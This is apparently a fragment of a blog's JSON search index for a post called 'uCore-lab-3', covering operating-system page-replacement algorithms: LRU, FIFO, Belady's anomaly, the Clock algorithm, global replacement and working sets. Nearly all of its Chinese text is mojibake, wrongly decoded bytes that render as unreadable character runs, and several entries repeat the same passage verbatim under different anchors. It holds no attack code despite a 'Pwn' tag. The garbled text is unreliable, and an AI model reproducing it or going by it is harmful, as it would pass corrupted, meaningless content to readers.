","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç®€ä»‹"},{"categories":["Pwning"],"content":"æœ€è¿‘æœ€å°‘ç”¨ç®—æ³•ï¼ˆLRUï¼‰ç®€ä»‹ æ€è·¯ï¼šé€‰æ‹©æœ€é•¿æ—¶é—´æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ å®ç°ï¼šç¼ºé¡µæ—¶ï¼Œè®¡ç®—å†…å­˜ä¸­æ¯ä¸ªé€»è¾‘é¡µé¢çš„ä¸Šä¸€ä¸ªè®¿é—®æ—¶é—´ï¼Œå¹¶é€‰æ‹©ä¸Šä¸€ä¸ªä½¿ç”¨åˆ°å½“å‰æ—¶é—´æœ€é•¿çš„é¡µé¢ã€‚ ç‰¹å¾ï¼šæœ€ä¼˜ç½®æ¢ç®—æ³•çš„ä¸€ç§è¿‘ä¼¼ã€‚ b. å…·ä½“å®ç° é¡µé¢é“¾è¡¨ ç³»ç»Ÿç»´æŠ¤ä¸€ä¸ªæŒ‰æœ€è¿‘ä¸€æ¬¡è®¿é—®æ—¶é—´æ’åºçš„é¡µé¢é“¾è¡¨ é“¾è¡¨é¦–èŠ‚ç‚¹æ˜¯æœ€è¿‘åˆšåˆšä½¿ç”¨è¿‡çš„é¡µé¢ é“¾è¡¨å°¾ç»“ç‚¹æ˜¯æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢ è®¿é—®å†…å­˜æ—¶ï¼Œæ‰¾åˆ°ç›¸åº”é¡µé¢å¹¶å°†å…¶ç§»è‡³é“¾è¡¨ä¹‹é¦– ç¼ºé¡µæ—¶ï¼Œç½®æ¢é“¾è¡¨å°¾ç»“ç‚¹çš„é¡µé¢ æ´»åŠ¨é¡µé¢æ ˆ è®¿é—®é¡µé¢æ—¶ï¼Œå°†æ­¤é¡µå·å‹å…¥æ ˆåº•ã€‚å¹¶å°†æ ˆå†…ç›¸åŒçš„é¡µå·æŠ½å‡º ç¼ºé¡µæ—¶ï¼Œç½®æ¢æ ˆåº•çš„é¡µé¢ã€‚ ä¸Šè¿°çš„ä¸¤ç§å®ç°éƒ½éœ€è¦ç»´æŠ¤ä»¥åŠéå†æœç´¢æŸä¸ªæ•°æ®ç»“æ„ï¼Œ åŒæ—¶LRUå¯¹äºè¿‡å»çš„è®¿é—®æƒ…å†µç»Ÿè®¡è¿‡äºç»†è‡´ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•è¾ƒä¸ºå¤æ‚ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#b-å…·ä½“å®ç°"},{"categories":["Pwning"],"content":"å…ˆè¿›å…ˆå‡ºç®—æ³•ï¼ˆFIFOï¼‰ åŸºæœ¬æ€è·¯ï¼šé€‰æ‹©åœ¨å†…å­˜ä¸­é©»ç•™æ—¶é—´æœ€é•¿çš„é¡µé¢å¹¶æ·˜æ±°ä¹‹ã€‚ å…·ä½“æ¥è¯´ï¼Œç³»ç»Ÿç»´æŠ¤ç€ä¸€ä¸ªé“¾è¡¨ï¼Œè®°å½•äº†æ‰€æœ‰ä½äºå†…å­˜å½“ä¸­çš„é€»è¾‘é¡µé¢ã€‚ä»é“¾è¡¨çš„æ’åˆ—é¡ºåºæ¥çœ‹ï¼Œé“¾é¦–é¡µé¢çš„é©»ç•™æ—¶é—´æœ€é•¿ï¼Œé“¾å°¾é¡µé¢çš„é©»ç•™æ—¶é—´æœ€çŸ­ã€‚å½“å‘ç”Ÿä¸€ä¸ªç¼ºé¡µä¸­æ–­æ—¶ï¼ŒæŠŠé“¾è¡¨é¦–é¡µé¢æ·˜æ±°å‡ºå±€ï¼Œå¹¶æŠŠæ–°çš„é¡µé¢æ·»åŠ åˆ°é“¾è¡¨çš„æœ«å°¾ã€‚ æ€§èƒ½è¾ƒå·®ï¼Œè°ƒå‡ºçš„é¡µé¢æœ‰å¯èƒ½æ˜¯ç»å¸¸è¦è®¿é—®çš„é¡µé¢ï¼Œå¹¶ä¸”æœ‰Beladyç°è±¡ã€‚FIFOç®—æ³•å¾ˆå°‘å•ç‹¬ä½¿ç”¨ã€‚ å®ç°ï¼šä¸€ä¸ªå•ä¸€çš„æŒ‡é’ˆå°±å¤Ÿäº† ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:3","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å…ˆè¿›å…ˆå‡ºç®—æ³•fifo"},{"categories":["Pwning"],"content":"Beladyç°è±¡ ç°è±¡ï¼š é‡‡ç”¨FIFOç­‰ç®—æ³•æ—¶ï¼Œå¯èƒ½å‡ºç°åˆ†é…çš„ç‰©ç†é¡µé¢æ•°å¢åŠ ï¼Œç¼ºé¡µæ¬¡æ•°åè€Œå‡é«˜çš„å¼‚å¸¸æƒ…å†µã€‚ åŸå› ï¼š FIFOç®—æ³•çš„ç½®æ¢ç‰¹å¾ä¸è¿›ç¨‹è®¿é—®å†…å­˜çš„åŠ¨æ€ç‰¹å¾çŸ›ç›¾ è¢«ç½®æ¢å‡ºå»çš„é¡µé¢å¹¶ä¸ä¸€å®šæ˜¯è¿›ç¨‹è¿‘æœŸä¸ä¼šè®¿é—®çš„ã€‚ LRUç®—æ³•å’ŒFIFOæœ¬è´¨ä¸Šéƒ½æ˜¯å…ˆè¿›å…ˆå‡ºçš„æ€è·¯ï¼Œåªä¸è¿‡LRUæ˜¯é’ˆå¯¹é¡µé¢çš„æœ€è¿‘è®¿é—®æ—¶é—´æ¥è¿›è¡Œæ’åºï¼Œæ‰€ä»¥éœ€è¦åœ¨æ¯ä¸€æ¬¡é¡µé¢è®¿é—®çš„æ—¶å€™åŠ¨æ€çš„è°ƒæ•´å„ä¸ªé¡µé¢ä¹‹é—´çš„å…ˆåé¡ºåºï¼ˆæœ‰ä¸€ä¸ªé¡µé¢çš„æœ€è¿‘è®¿é—®æ—¶é—´å˜äº†ï¼‰ï¼› è€ŒFIFOæ˜¯é’ˆå¯¹é¡µé¢è¿›å…¥å†…å­˜çš„æ—¶é—´æ¥è¿›è¡Œæ’åºã€‚è¿™ä¸ªæ—¶é—´æ˜¯å›ºå®šä¸å˜çš„ï¼Œæ‰€ä»¥å„é¡µé¢ä¹‹é—´çš„å…ˆåé¡ºåºæ˜¯å›ºå®šçš„ã€‚å¦‚æœä¸€ä¸ªé¡µé¢åœ¨è¿›å…¥å†…å­˜ä¹‹åæ²¡æœ‰è¢«è®¿é—®ï¼Œé‚£ä¹ˆå®ƒçš„æœ€è¿‘è®¿é—®æ—¶é—´å°±æ˜¯å®ƒè¿›å…¥å†…å­˜çš„æ—¶é—´ã€‚ æ¢å¥è¯è¯´ï¼Œå¦‚æœå†…å­˜å½“ä¸­çš„æ‰€æœ‰é¡µé¢éƒ½æœªæ›¾è®¿é—®è¿‡ï¼Œé‚£ä¹ˆLRUå°±é€€åŒ–ä¸ºFIFOç®—æ³•ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:4","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#beladyç°è±¡"},{"categories":["Pwning"],"content":"æ”¹è¿›çš„æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•ï¼ˆClockï¼‰ç®€ä»‹ æ€è·¯ï¼š ä»…å¯¹é¡µé¢çš„è®¿é—®æƒ…å†µè¿›è¡Œå¤§è‡´ç»Ÿè®¡ å‡å°ä¿®æ”¹é¡µçš„ç¼ºé¡µå¤„ç†å¼€é”€ æ•°æ®ç»“æ„ï¼š åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ è®¿é—®ä½ï¼Œæè¿°é¡µé¢åœ¨è¿‡å»ä¸€æ®µæ—¶é—´çš„å†…è®¿é—®æƒ…å†µã€‚ åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ ä¿®æ”¹ä½ï¼Œä»¥åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦ä¿®æ”¹è¿‡ä½†æ²¡æœ‰å­˜å…¥å¤–å­˜ã€‚ å„é¡µé¢ç»„ç»‡æˆç¯å½¢é“¾è¡¨ï¼ŒåŒæ—¶æŒ‡é’ˆæŒ‡å‘æœ€å…ˆè°ƒå…¥çš„é¡µé¢ã€‚ ç®—æ³• è®¿é—®é¡µé¢æ—¶ï¼Œåœ¨é¡µè¡¨é¡¹è®°å½•é¡µé¢è®¿é—®æƒ…å†µ ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå¤„å¼€å§‹é¡ºåºæŸ¥æ‰¾æœªè¢«è®¿é—®ä¸æœªè¢«ä¿®æ”¹çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ ç‰¹å¾ï¼š æ—¶é’Ÿç®—æ³•æ˜¯LRUä¸FIFOçš„æŠ˜ä¸­ã€‚ å…·ä½“å®ç° é¡µé¢è£…å…¥å†…å­˜æ—¶ï¼Œè®¿é—®ä½åˆå§‹åŒ–ä¸º0 è®¿é—®é¡µé¢ï¼ˆè¯»/å†™ï¼‰æ—¶ï¼Œè®¿é—®ä½ç½®ä¸º1 ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå½“å‰ä½ç½®é¡ºåºæ£€æŸ¥ç¯å½¢é“¾è¡¨ã€‚ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º0ï¼Œåˆ™ç½®æ¢è¯¥é¡µ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º1ï¼Œåˆ™è®¾ç½®è¯¥é¡µçš„è®¿é—®ä½ä¸º0ï¼Œå¹¶ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°æ‰¾åˆ°å¯ç½®æ¢çš„é¡µé¢ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#æ”¹è¿›çš„æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•clock"},{"categories":["Pwning"],"content":"æ”¹è¿›çš„æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•ï¼ˆClockï¼‰ç®€ä»‹ æ€è·¯ï¼š ä»…å¯¹é¡µé¢çš„è®¿é—®æƒ…å†µè¿›è¡Œå¤§è‡´ç»Ÿè®¡ å‡å°ä¿®æ”¹é¡µçš„ç¼ºé¡µå¤„ç†å¼€é”€ æ•°æ®ç»“æ„ï¼š åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ è®¿é—®ä½ï¼Œæè¿°é¡µé¢åœ¨è¿‡å»ä¸€æ®µæ—¶é—´çš„å†…è®¿é—®æƒ…å†µã€‚ åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ ä¿®æ”¹ä½ï¼Œä»¥åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦ä¿®æ”¹è¿‡ä½†æ²¡æœ‰å­˜å…¥å¤–å­˜ã€‚ å„é¡µé¢ç»„ç»‡æˆç¯å½¢é“¾è¡¨ï¼ŒåŒæ—¶æŒ‡é’ˆæŒ‡å‘æœ€å…ˆè°ƒå…¥çš„é¡µé¢ã€‚ ç®—æ³• è®¿é—®é¡µé¢æ—¶ï¼Œåœ¨é¡µè¡¨é¡¹è®°å½•é¡µé¢è®¿é—®æƒ…å†µ ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå¤„å¼€å§‹é¡ºåºæŸ¥æ‰¾æœªè¢«è®¿é—®ä¸æœªè¢«ä¿®æ”¹çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ ç‰¹å¾ï¼š æ—¶é’Ÿç®—æ³•æ˜¯LRUä¸FIFOçš„æŠ˜ä¸­ã€‚ å…·ä½“å®ç° é¡µé¢è£…å…¥å†…å­˜æ—¶ï¼Œè®¿é—®ä½åˆå§‹åŒ–ä¸º0 è®¿é—®é¡µé¢ï¼ˆè¯»/å†™ï¼‰æ—¶ï¼Œè®¿é—®ä½ç½®ä¸º1 ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå½“å‰ä½ç½®é¡ºåºæ£€æŸ¥ç¯å½¢é“¾è¡¨ã€‚ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º0ï¼Œåˆ™ç½®æ¢è¯¥é¡µ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º1ï¼Œåˆ™è®¾ç½®è¯¥é¡µçš„è®¿é—®ä½ä¸º0ï¼Œå¹¶ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°æ‰¾åˆ°å¯ç½®æ¢çš„é¡µé¢ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ç®€ä»‹-1"},{"categories":["Pwning"],"content":"æ”¹è¿›çš„æ—¶é’Ÿé¡µé¢ç½®æ¢ç®—æ³•ï¼ˆClockï¼‰ç®€ä»‹ æ€è·¯ï¼š ä»…å¯¹é¡µé¢çš„è®¿é—®æƒ…å†µè¿›è¡Œå¤§è‡´ç»Ÿè®¡ å‡å°ä¿®æ”¹é¡µçš„ç¼ºé¡µå¤„ç†å¼€é”€ æ•°æ®ç»“æ„ï¼š åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ è®¿é—®ä½ï¼Œæè¿°é¡µé¢åœ¨è¿‡å»ä¸€æ®µæ—¶é—´çš„å†…è®¿é—®æƒ…å†µã€‚ åœ¨é¡µè¡¨é¡¹ä¸­å¢åŠ ä¿®æ”¹ä½ï¼Œä»¥åˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦ä¿®æ”¹è¿‡ä½†æ²¡æœ‰å­˜å…¥å¤–å­˜ã€‚ å„é¡µé¢ç»„ç»‡æˆç¯å½¢é“¾è¡¨ï¼ŒåŒæ—¶æŒ‡é’ˆæŒ‡å‘æœ€å…ˆè°ƒå…¥çš„é¡µé¢ã€‚ ç®—æ³• è®¿é—®é¡µé¢æ—¶ï¼Œåœ¨é¡µè¡¨é¡¹è®°å½•é¡µé¢è®¿é—®æƒ…å†µ ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå¤„å¼€å§‹é¡ºåºæŸ¥æ‰¾æœªè¢«è®¿é—®ä¸æœªè¢«ä¿®æ”¹çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ ç‰¹å¾ï¼š æ—¶é’Ÿç®—æ³•æ˜¯LRUä¸FIFOçš„æŠ˜ä¸­ã€‚ å…·ä½“å®ç° é¡µé¢è£…å…¥å†…å­˜æ—¶ï¼Œè®¿é—®ä½åˆå§‹åŒ–ä¸º0 è®¿é—®é¡µé¢ï¼ˆè¯»/å†™ï¼‰æ—¶ï¼Œè®¿é—®ä½ç½®ä¸º1 ç¼ºé¡µæ—¶ï¼Œä»æŒ‡é’ˆå½“å‰ä½ç½®é¡ºåºæ£€æŸ¥ç¯å½¢é“¾è¡¨ã€‚ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º0ï¼Œåˆ™ç½®æ¢è¯¥é¡µ è‹¥å½“å‰éå†åˆ°çš„é¡µé¢è®¿é—®ä½ä¸º1ï¼Œåˆ™è®¾ç½®è¯¥é¡µçš„è®¿é—®ä½ä¸º0ï¼Œå¹¶ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œç›´åˆ°æ‰¾åˆ°å¯ç½®æ¢çš„é¡µé¢ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:5","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å…·ä½“å®ç°"},{"categories":["Pwning"],"content":"å…¨å±€ç½®æ¢ç®—æ³• æ€è·¯ï¼šå…¨å±€ç½®æ¢ç®—æ³•ä¸ºè¿›ç¨‹åˆ†é…å¯å˜æ•°ç›®çš„ç‰©ç†é¡µé¢ã€‚ è¦è§£å†³çš„é—®é¢˜ï¼š è¿›ç¨‹åœ¨ä¸åŒé˜¶æ®µçš„å†…å­˜éœ€æ±‚æ˜¯æœ‰å˜åŒ–çš„ã€‚ åˆ†é…ç»™è¿›ç¨‹çš„å†…å­˜ä¹Ÿéœ€è¦åœ¨ä¸åŒé˜¶æ®µæœ‰æ‰€å˜åŒ–ã€‚ å…¨å±€ç½®æ¢ç®—æ³•éœ€è¦ç¡®å®šåˆ†é…ç»™è¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ã€‚ CPUåˆ©ç”¨ç‡ä¸å¹¶å‘è¿›ç¨‹æ•°å­˜åœ¨ç›¸äº’åˆ¶çº¦çš„å…³ç³»ã€‚ è¿›ç¨‹æ•°å°‘æ—¶ï¼Œæé«˜å¹¶å‘è¿›ç¨‹æ•°ï¼Œå¯æé«˜CPUåˆ©ç”¨æ•ˆç‡ã€‚ å¹¶å‘è¿›ç¨‹å¯¼è‡´å†…å­˜è®¿é—®å¢åŠ  å¹¶å‘è¿›ç¨‹çš„å†…å­˜è®¿é—®ä¼šé™ä½äº†è®¿å­˜çš„å±€éƒ¨æ€§ç‰¹å¾ã€‚ å±€éƒ¨æ€§ç‰¹å¾çš„ä¸‹é™ä¼šå¯¼è‡´ç¼ºé¡µç‡ä¸Šå‡å’ŒCPUåˆ©ç”¨ç‡ä¸‹é™ã€‚ å…¨å±€é¡µé¢ç½®æ¢ç®—æ³•ç½®æ¢å†…å­˜ä¸­æ‰€æœ‰å¯æ¢å‡ºçš„ç‰©ç†é¡µé¢ï¼Œå³æ¢è¿›å†…å­˜çš„æ˜¯è¿›ç¨‹Açš„é¡µé¢ï¼Œæ¢å‡ºå†…å­˜çš„å¯èƒ½æ˜¯è¿›ç¨‹Bçš„é¡µé¢ï¼Œæ‰€ä»¥è¿›ç¨‹åœ¨å†…å­˜ä¸­å ç”¨çš„é¡µé¢æ€»æ•°æ˜¯å¯å˜çš„ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å…¨å±€ç½®æ¢ç®—æ³•"},{"categories":["Pwning"],"content":"å·¥ä½œé›†ç½®æ¢ç®—æ³•å·¥ä½œé›†ä¸å¸¸é©»é›† å·¥ä½œé›† æ˜¯ä¸€ä¸ªè¿›ç¨‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„é€»è¾‘é¡µé¢é›†åˆï¼Œå¯è¡¨ç¤ºä¸ºäºŒå…ƒå‡½æ•°W(t,Î”)W(t,Î”) ttæ˜¯å½“å‰çš„æ‰§è¡Œæ—¶åˆ» Î” ç§°ä¸ºå·¥ä½œé›†çª—å£(working-set window)ï¼Œå³ä¸€ä¸ªå®šé•¿çš„é¡µé¢è®¿é—®æ—¶é—´çš„çª—å£ã€‚ W(t,Î”)W(t,Î”)æŒ‡åœ¨å½“å‰æ—¶åˆ»ttå‰çš„Î”æ—¶é—´çª—å£ä¸­çš„æ‰€æœ‰è®¿é—®é¡µé¢æ‰€ç»„æˆçš„é›†åˆã€‚ |W(t,Î”)||W(t,Î”)|æŒ‡å·¥ä½œé›†çš„å¤§å°ï¼Œå³é¡µé¢æ•°ç›®ã€‚ å¸¸é©»é›†æ˜¯å½“å‰æ—¶åˆ»è¿›ç¨‹å®é™…é©»ç•™åœ¨å†…å­˜ä¸­çš„é¡µé¢é›†åˆã€‚ å·¥ä½œé›†ä¸å¸¸é©»é›†çš„å…³ç³» å·¥ä½œé›†æ˜¯è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å›ºæœ‰çš„æ€§è´¨ å¸¸é©»é›†å–å†³äºç³»ç»Ÿåˆ†é…ç»™è¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ç›®å’Œé¡µé¢ç½®æ¢ç®—æ³•ã€‚ æ€è·¯ å½“å‰æ—¶åˆ»å‰Ï„Ï„ä¸ªå†…å­˜è®¿é—®çš„é¡µå¼•ç”¨æ˜¯å·¥ä½œé›†ã€‚å…¶ä¸­Ï„Ï„è¢«ç§°ä¸ºçª—å£å¤§å°ã€‚ æ¢å‡ºä¸åœ¨å·¥ä½œé›†ä¸­çš„é¡µé¢ å…·ä½“å®ç° è®¿å­˜é“¾è¡¨ï¼šç»´æŠ¤çª—å£å†…çš„è®¿å­˜é¡µé¢ è®¿å­˜æ—¶ï¼Œæ¢å‡ºä¸åœ¨å·¥ä½œé›†çš„é¡µé¢ï¼› æ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ç¼ºé¡µæ—¶ï¼Œæ¢å…¥é¡µé¢ï¼Œæ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å·¥ä½œé›†ç½®æ¢ç®—æ³•"},{"categories":["Pwning"],"content":"å·¥ä½œé›†ç½®æ¢ç®—æ³•å·¥ä½œé›†ä¸å¸¸é©»é›† å·¥ä½œé›† æ˜¯ä¸€ä¸ªè¿›ç¨‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„é€»è¾‘é¡µé¢é›†åˆï¼Œå¯è¡¨ç¤ºä¸ºäºŒå…ƒå‡½æ•°W(t,Î”)W(t,Î”) ttæ˜¯å½“å‰çš„æ‰§è¡Œæ—¶åˆ» Î” ç§°ä¸ºå·¥ä½œé›†çª—å£(working-set window)ï¼Œå³ä¸€ä¸ªå®šé•¿çš„é¡µé¢è®¿é—®æ—¶é—´çš„çª—å£ã€‚ W(t,Î”)W(t,Î”)æŒ‡åœ¨å½“å‰æ—¶åˆ»ttå‰çš„Î”æ—¶é—´çª—å£ä¸­çš„æ‰€æœ‰è®¿é—®é¡µé¢æ‰€ç»„æˆçš„é›†åˆã€‚ |W(t,Î”)||W(t,Î”)|æŒ‡å·¥ä½œé›†çš„å¤§å°ï¼Œå³é¡µé¢æ•°ç›®ã€‚ å¸¸é©»é›†æ˜¯å½“å‰æ—¶åˆ»è¿›ç¨‹å®é™…é©»ç•™åœ¨å†…å­˜ä¸­çš„é¡µé¢é›†åˆã€‚ å·¥ä½œé›†ä¸å¸¸é©»é›†çš„å…³ç³» å·¥ä½œé›†æ˜¯è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å›ºæœ‰çš„æ€§è´¨ å¸¸é©»é›†å–å†³äºç³»ç»Ÿåˆ†é…ç»™è¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ç›®å’Œé¡µé¢ç½®æ¢ç®—æ³•ã€‚ æ€è·¯ å½“å‰æ—¶åˆ»å‰Ï„Ï„ä¸ªå†…å­˜è®¿é—®çš„é¡µå¼•ç”¨æ˜¯å·¥ä½œé›†ã€‚å…¶ä¸­Ï„Ï„è¢«ç§°ä¸ºçª—å£å¤§å°ã€‚ æ¢å‡ºä¸åœ¨å·¥ä½œé›†ä¸­çš„é¡µé¢ å…·ä½“å®ç° è®¿å­˜é“¾è¡¨ï¼šç»´æŠ¤çª—å£å†…çš„è®¿å­˜é¡µé¢ è®¿å­˜æ—¶ï¼Œæ¢å‡ºä¸åœ¨å·¥ä½œé›†çš„é¡µé¢ï¼› æ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ç¼ºé¡µæ—¶ï¼Œæ¢å…¥é¡µé¢ï¼Œæ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å·¥ä½œé›†ä¸å¸¸é©»é›†"},{"categories":["Pwning"],"content":"å·¥ä½œé›†ç½®æ¢ç®—æ³•å·¥ä½œé›†ä¸å¸¸é©»é›† å·¥ä½œé›† æ˜¯ä¸€ä¸ªè¿›ç¨‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„é€»è¾‘é¡µé¢é›†åˆï¼Œå¯è¡¨ç¤ºä¸ºäºŒå…ƒå‡½æ•°W(t,Î”)W(t,Î”) ttæ˜¯å½“å‰çš„æ‰§è¡Œæ—¶åˆ» Î” ç§°ä¸ºå·¥ä½œé›†çª—å£(working-set window)ï¼Œå³ä¸€ä¸ªå®šé•¿çš„é¡µé¢è®¿é—®æ—¶é—´çš„çª—å£ã€‚ W(t,Î”)W(t,Î”)æŒ‡åœ¨å½“å‰æ—¶åˆ»ttå‰çš„Î”æ—¶é—´çª—å£ä¸­çš„æ‰€æœ‰è®¿é—®é¡µé¢æ‰€ç»„æˆçš„é›†åˆã€‚ |W(t,Î”)||W(t,Î”)|æŒ‡å·¥ä½œé›†çš„å¤§å°ï¼Œå³é¡µé¢æ•°ç›®ã€‚ å¸¸é©»é›†æ˜¯å½“å‰æ—¶åˆ»è¿›ç¨‹å®é™…é©»ç•™åœ¨å†…å­˜ä¸­çš„é¡µé¢é›†åˆã€‚ å·¥ä½œé›†ä¸å¸¸é©»é›†çš„å…³ç³» å·¥ä½œé›†æ˜¯è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å›ºæœ‰çš„æ€§è´¨ å¸¸é©»é›†å–å†³äºç³»ç»Ÿåˆ†é…ç»™è¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ç›®å’Œé¡µé¢ç½®æ¢ç®—æ³•ã€‚ æ€è·¯ å½“å‰æ—¶åˆ»å‰Ï„Ï„ä¸ªå†…å­˜è®¿é—®çš„é¡µå¼•ç”¨æ˜¯å·¥ä½œé›†ã€‚å…¶ä¸­Ï„Ï„è¢«ç§°ä¸ºçª—å£å¤§å°ã€‚ æ¢å‡ºä¸åœ¨å·¥ä½œé›†ä¸­çš„é¡µé¢ å…·ä½“å®ç° è®¿å­˜é“¾è¡¨ï¼šç»´æŠ¤çª—å£å†…çš„è®¿å­˜é¡µé¢ è®¿å­˜æ—¶ï¼Œæ¢å‡ºä¸åœ¨å·¥ä½œé›†çš„é¡µé¢ï¼› æ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ç¼ºé¡µæ—¶ï¼Œæ¢å…¥é¡µé¢ï¼Œæ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:2:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#æ€è·¯"},{"categories":["Pwning"],"content":"å·¥ä½œé›†ç½®æ¢ç®—æ³•å·¥ä½œé›†ä¸å¸¸é©»é›† å·¥ä½œé›† æ˜¯ä¸€ä¸ªè¿›ç¨‹å½“å‰æ­£åœ¨ä½¿ç”¨çš„é€»è¾‘é¡µé¢é›†åˆï¼Œå¯è¡¨ç¤ºä¸ºäºŒå…ƒå‡½æ•°W(t,Î”)W(t,Î”) ttæ˜¯å½“å‰çš„æ‰§è¡Œæ—¶åˆ» Î” ç§°ä¸ºå·¥ä½œé›†çª—å£(working-set window)ï¼Œå³ä¸€ä¸ªå®šé•¿çš„é¡µé¢è®¿é—®æ—¶é—´çš„çª—å£ã€‚ W(t,Î”)W(t,Î”)æŒ‡åœ¨å½“å‰æ—¶åˆ»ttå‰çš„Î”æ—¶é—´çª—å£ä¸­çš„æ‰€æœ‰è®¿é—®é¡µé¢æ‰€ç»„æˆçš„é›†åˆã€‚ |W(t,Î”)||W(t,Î”)|æŒ‡å·¥ä½œé›†çš„å¤§å°ï¼Œå³é¡µé¢æ•°ç›®ã€‚ å¸¸é©»é›†æ˜¯å½“å‰æ—¶åˆ»è¿›ç¨‹å®é™…é©»ç•™åœ¨å†…å­˜ä¸­çš„é¡µé¢é›†åˆã€‚ å·¥ä½œé›†ä¸å¸¸é©»é›†çš„å…³ç³» å·¥ä½œé›†æ˜¯è¿›ç¨‹åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å›ºæœ‰çš„æ€§è´¨ å¸¸é©»é›†å–å†³äºç³»ç»Ÿåˆ†é…ç»™è¿›ç¨‹çš„ç‰©ç†é¡µé¢æ•°ç›®å’Œé¡µé¢ç½®æ¢ç®—æ³•ã€‚ æ€è·¯ å½“å‰æ—¶åˆ»å‰Ï„Ï„ä¸ªå†…å­˜è®¿é—®çš„é¡µå¼•ç”¨æ˜¯å·¥ä½œé›†ã€‚å…¶ä¸­Ï„Ï„è¢«ç§°ä¸ºçª—å£å¤§å°ã€‚ æ¢å‡ºä¸åœ¨å·¥ä½œé›†ä¸­çš„é¡µé¢ å…·ä½“å®ç° è®¿å­˜é“¾è¡¨ï¼šç»´æŠ¤çª—å£å†…çš„è®¿å­˜é¡µé¢ è®¿å­˜æ—¶ï¼Œæ¢å‡ºä¸åœ¨å·¥ä½œé›†çš„é¡µé¢ï¼› æ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ ç¼ºé¡µæ—¶ï¼Œæ¢å…¥é¡µé¢ï¼Œæ›´æ–°è®¿å­˜é“¾è¡¨ã€‚ 